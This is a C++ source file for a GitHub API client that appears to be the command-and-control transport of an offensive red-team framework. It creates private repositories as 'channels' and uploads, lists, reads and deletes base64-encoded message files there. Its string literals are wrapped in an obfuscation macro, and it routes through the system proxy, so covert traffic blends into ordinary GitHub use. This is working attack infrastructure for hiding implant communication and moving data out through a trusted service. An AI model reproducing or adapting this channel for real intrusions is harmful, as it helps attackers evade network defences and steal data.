#include "stdafx.h"
#include "GithubApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/Utils.h"

using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

namespace
{
	std::wstring ToWideString(std::string const& str)
	{
		return Convert<Utf16>(str);
	}
}


FSecure::GithubApi::GithubApi(std::string const& token, std::string const& channelName, std::string const& userAgent)
{
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);


	std::string lowerChannelName = channelName;
	std::transform(lowerChannelName.begin(), lowerChannelName.end(), lowerChannelName.begin(), [](unsigned char c) { return std::tolower(c); });

	SetToken(token);
	SetUserAgent(userAgent);
	SetUser();
	SetChannel(CreateChannel(lowerChannelName));
}

void FSecure::GithubApi::SetUser()
{
	std::string url = OBF("https://api.github.com/user");
	json response = SendJsonRequest(url, NULL, Method::GET);

	if (!response.contains(OBF("login")))
		throw std::runtime_error(OBF("Github: bad credentials\n"));

	this->m_Username = response[OBF("login")];
}

void FSecure::GithubApi::SetUserAgent(std::string const& userAgent)
{
	this->m_UserAgent = userAgent;
}

void FSecure::GithubApi::SetToken(std::string const& token)
{
	this->m_Token = token;
}

void FSecure::GithubApi::SetChannel(std::string const& channelName)
{
	this->m_Channel = channelName;
}

std::map<std::string, std::int64_t> FSecure::GithubApi::ListChannels()
{
	std::map<std::string, std::int64_t> channelMap;
	std::string url = OBF("https://api.github.com/user/repos");

	json response = SendJsonRequest(url, NULL, Method::GET);

	for (auto& channel : response)
	{
		std::string channelName = channel[OBF("name")];

		std::int64_t cId = channel[OBF("id")];

		channelMap.insert({ channelName, cId });
	}

	return channelMap;
}

std::string FSecure::GithubApi::CreateChannel(std::string const& channelName)
{
	std::map<std::string, std::int64_t> channels = this->ListChannels();

	if (channels.find(channelName) == channels.end())
	{
		auto url = OBF("https://api.github.com/user/repos");

		json j;
		j[OBF("name")] = channelName;
		j[OBF("auto_init")] = true;
		j[OBF("private")] = true;

		auto response = SendJsonRequest(url, j, Method::POST);

		if (response.contains(OBF("message")))
			throw std::runtime_error(OBF("Github: unable to create channel - ") + response[OBF("message")]);
	}

	return channelName;
}

FSecure::ByteVector FSecure::GithubApi::ReadFile(std::string const& fileDownloadURL)
{
	ByteVector content = SendHttpRequest(fileDownloadURL, "", Method::GET, true);

	return content;
}

void FSecure::GithubApi::UploadFile(ByteView data, std::string const& filename)
{
	if (filename.empty())
		throw std::runtime_error{ OBF("Github: filename cannot be empty") };

	auto url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel + OBF("/contents/") + filename;

	json j;
	j[OBF("message")] = OBF("Initial Commit");
	j[OBF("branch")] = OBF("main");
	j[OBF("content")] = cppcodec::base64_rfc4648::encode(data);

	SendJsonRequest(url, j, Method::PUT);
}

void FSecure::GithubApi::DeleteFile(FileEntry const& file)
{
	auto url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel + OBF("/contents/") + file.m_Name;

	json j;
	j[OBF("message")] = OBF("Initial Commit");
	j[OBF("sha")] = file.m_Sha;

	SendJsonRequest(url, j, Method::DEL);
}

void FSecure::GithubApi::DeleteAllFiles()
{
	//delete repo
	auto url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel;
	auto response = SendJsonRequest(url, NULL, Method::DEL);

	if (response.contains(OBF("message")))
		throw std::runtime_error(OBF("Throwing exception: unable to delete repository\n"));
}

std::vector<FSecure::GithubApi::FileEntry> FSecure::GithubApi::GetMessagesByDirection(std::string const& direction)
{
	std::string url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel + OBF("/contents");

	auto response = json::parse(SendHttpRequest(url, OBF("*/*"), Method::GET, true));

	std::vector<FileEntry> messages;
	for (auto& match : response)
	{
		if (auto filename = match.at(OBF("name")).get<std::string>();
			match.at(OBF("type")) == OBF("file") and
			filename.substr(0, direction.size()) == direction)
		{
			messages.emplace_back(filename, match.at(OBF("sha")), match.at(OBF("download_url")));
		}
	}

	return messages;
}

FSecure::ByteVector FSecure::GithubApi::SendHttpRequest(std::string const& host, FSecure::WinHttp::ContentType contentType, std::vector<uint8_t> const& data, FSecure::WinHttp::Method method, bool setAuthorizationHeader)
{
	return SendHttpRequest(host, GetContentType(contentType), data, method, setAuthorizationHeader);
}

FSecure::ByteVector FSecure::GithubApi::SendHttpRequest(std::string const& host, std::wstring const& contentType, std::vector<uint8_t> const& data, FSecure::WinHttp::Method method, bool setAuthorizationHeader)
{
	while (true)
	{
		HttpClient webClient(ToWideString(host), m_ProxyConfig);
		HttpRequest request;
		request.m_Method = method;

		if (!data.empty())
		{
			request.SetData(contentType, data);
		}

		request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));

		if (setAuthorizationHeader)
		{ // Only set Authorization header when needed (S3 doesn't like this header)
			request.SetHeader(Header::Authorization, OBF(L"token ") + ToWideString(this->m_Token));
		}

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created)
		{
			return resp.GetData();
		}
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests || resp.GetStatusCode() == StatusCode::Conflict)
		{
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		}
		else
		{
			throw std::exception(OBF("[x] Non 200/201/429 HTTP Response\n"));
		}
	}
}

FSecure::ByteVector FSecure::GithubApi::SendHttpRequest(std::string const& host, std::string const& acceptType, FSecure::WinHttp::Method method, bool setAuthorizationHeader)
{
	while (true)
	{
		HttpClient webClient(ToWideString(host), m_ProxyConfig);
		HttpRequest request;
		request.m_Method = method;

		request.SetHeader(Header::Accept, ToWideString(acceptType));

		request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));

		if (setAuthorizationHeader)
		{ // Only set Authorization header when needed (S3 doesn't like this header)
			request.SetHeader(Header::Authorization, OBF(L"token ") + ToWideString(this->m_Token));
		}

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created)
		{
			return resp.GetData();
		}
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests)
		{
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		}
		else
		{
			throw std::exception(OBF("[x] Non 200/201/429 HTTP Response\n"));
		}
	}
}

json FSecure::GithubApi::SendJsonRequest(std::string const& url, json const& data, FSecure::WinHttp::Method method)
{
	if (data == NULL)
	{
		return json::parse(SendHttpRequest(url, ContentType::MultipartFormData, {}, method));
	}
	else
	{
		std::string j = data.dump();
		return json::parse(SendHttpRequest(url, ContentType::ApplicationJson, { std::make_move_iterator(j.begin()), std::make_move_iterator(j.end()) }, method));
	}
}

FSecure::GithubApi::FileEntry::FileEntry(std::string name, std::string sha, std::string downloadUrl) :
	m_Name{ std::move(name) },
	m_Sha{ std::move(sha) },
	m_DownloadUrl{ std::move(downloadUrl) }
{
}
